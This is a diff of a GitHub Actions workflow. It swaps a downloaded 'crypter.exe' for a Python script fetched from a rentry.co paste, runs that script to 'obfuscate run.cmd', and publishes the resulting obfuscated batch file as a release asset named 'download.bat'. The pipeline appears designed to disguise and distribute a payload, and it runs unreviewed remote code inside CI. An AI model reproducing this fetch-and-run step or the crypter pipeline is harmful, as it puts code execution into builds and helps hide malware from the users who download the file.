@@ -16,13 +16,13 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Download main.exe
+      - name: Download main.py
         run: |
-          Invoke-WebRequest -Uri https://github.com/43a1723/test/releases/download/siu/crypter.exe -OutFile main.exe
+          Invoke-WebRequest -Uri https://rentry.co/6artz93e/raw -OutFile main.py
 
       - name: Obfuscate run.cmd
         run: |
-          .\main.exe
+          python main.py
 
       - name: Delete-tag-and-release
         uses: dev-drprasad/delete-tag-and-release@v1.1
@@ -39,7 +39,7 @@ jobs:
         with:
           tag_name: AutoBuild
           release_name: AutoBuild
-          body: ${{ steps.changelog.outputs.changelog }}
+          body: Obfuscated run.cmd file
           draft: false
           prerelease: false
 
@@ -52,4 +52,4 @@ jobs:
           upload_url: ${{ steps.create_release.outputs.upload_url }}
           asset_path: run-obf.bat
           asset_name: download.bat
-          asset_content_type: application/zip
+          asset_content_type: application/octet-stream
